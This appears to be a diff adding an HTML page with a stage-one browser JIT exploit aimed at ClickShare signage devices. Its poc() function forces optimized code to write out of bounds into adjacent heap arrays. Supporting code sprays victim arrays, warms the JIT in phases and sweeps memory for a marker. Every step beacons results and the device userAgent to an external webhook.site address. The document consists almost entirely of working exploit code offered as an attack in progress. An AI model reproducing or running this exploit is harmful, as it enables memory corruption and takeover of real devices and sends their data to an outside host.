@@ -1,0 +1,86 @@
+<html><body><script>
+// ClickShare signage -- stage 1 S2 = steerable single-write OOB (q2 proved the write fires and
+// kills via victim HEADER; here every OOB write is a SINGLE poc() call with a CHOSEN small index,
+// phased async so beacons flush between risky steps; no wild value anywhere).
+// Outcomes per dirt: silent+no-hit = not optimized yet; crash = header hit (dirt names it);
+// HIT-mark = write landed in victim DATA = stage 1 complete.
+// Pacing from the proven-survivable P1 page; write path from the proven-fatal q2/r3 pages.
+const SINK = 'https://webhook.site/d0c9f8c5-8be9-4734-a9ba-adb0216040c3';
+const MARKER = 1.2345678901234e-300;
+function beacon(t, v){
+  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
+}
+beacon('S2-start', navigator.userAgent.slice(0,80));
+try {
+  const RING = 4000;              // keep ALL victims (evictions lost evidence on the ring-48 page)
+  var ring = [];
+  for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
+  var arrx = new Array(150); for (let z = 0; z < 150; z++) arrx[z] = 0.5 + z;
+  beacon('S2-pool-done', RING);
+
+  var fake = new Uint32Array(10);
+  fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+  var tahir = 0x1;
+  var hits = 0, warmCalls = 0;
+  function poc(a, dirt) {
+    var oob_array = [0.5, 1.5, 2.5, 3.5, 4.5];      // PACKED_DOUBLE literal: no transition, no realloc
+    var victim = new Array(64); for (let z = 0; z < 64; z++) victim[z] = 1.0 + z;   // adjacent inline FixedDoubleArray
+    if (ring.length < 20000) ring.push(victim);      // never evict
+    let just_a_variable = fake[0];
+    let another_variable3 = fake[7];
+    if (a % 7 == 0) another_variable3 = dirt;
+    another_variable3 = Math.max(another_variable3, tahir);
+    another_variable3 = another_variable3 >>> 0;
+    var index = fake[3];
+    var for_phi_modes = fake[6];
+    let c = fake[1];
+    for (var i = 0; i < 10; i++) {
+      if (a % 3 == 0) just_a_variable = c;
+      if (a % 37 == 0) just_a_variable = fake[2];
+      if (a % 11 == 0) just_a_variable = fake[8];
+      if (a % 17 == 0) just_a_variable = fake[5];
+      if (a % 19 == 0) just_a_variable = fake[4];
+      if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
+      if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = MARKER; } } }
+      for_phi_modes = c; c = just_a_variable;
+    }
+    return index;
+  }
+  function warm(n){ for (let i = 0; i < n; i++) poc(i % 500 + 2, 4); warmCalls += n; }   // dirt=4: in-bounds even when optimized
+  function sweep(tag){
+    for (let j = 0; j < 150; j++) { if (arrx[j] === MARKER) { if (hits++ < 6) beacon('HIT-arrx','at='+tag+' j='+j); } }
+    for (let k = 0; k < ring.length; k++) {
+      var v = ring[k];
+      if (v.length !== 64) { if (hits++ < 6) beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); continue; }
+      for (let j = 0; j < 64; j++) { if (v[j] === MARKER) { if (hits++ < 6) beacon('HIT-mark','at='+tag+' k='+k+' j='+j); break; } }
+    }
+    beacon('S2-iter','at='+tag+' hits='+hits+' warm='+warmCalls);
+  }
+  // dirt geometry: oob elements idx0..4 = data; ~5-9 = victim JSArray/elements headers (crash zone);
+  // 16..80 = victim FixedDoubleArray data (hit zone); 96+ = beyond
+  var plan = [
+    {w: 0x500,  dirts: [20, 32, 48]},
+    {w: 3000,   dirts: [16, 24, 64]},
+    {w: 20000,  dirts: [16, 32, 96]}
+  ];
+  var p = 0;
+  function phase(){
+    if (p >= plan.length) { beacon('S2-SURVIVED','hits='+hits+' warm='+warmCalls); beacon('S2-done','end-of-page'); return; }
+    var st = plan[p]; p++;
+    try { warm(st.w); } catch (e) { beacon('S2-warm-exc','p='+(p-1)+':'+String(e).slice(0,80)); }
+    beacon('S2-warm-done','phase='+(p-1)+' calls='+warmCalls);
+    var d = 0;
+    function fire(){
+      if (d >= st.dirts.length) { setTimeout(phase, 120); return; }
+      var dirt = st.dirts[d++];
+      beacon('S2-fire','phase='+(p-1)+' dirt=0x'+dirt.toString(16));
+      setTimeout(function(){
+        try { poc(35, dirt); } catch (e) { beacon('S2-fire-exc','dirt='+dirt+':'+String(e).slice(0,80)); }
+        setTimeout(function(){ sweep('p'+(p-1)+'d'+dirt); setTimeout(fire, 120); }, 90);
+      }, 90);
+    }
+    setTimeout(fire, 120);
+  }
+  setTimeout(phase, 100);
+} catch (e) { beacon('S2-exc', String(e).slice(0,120)); }
+</script></body></html>
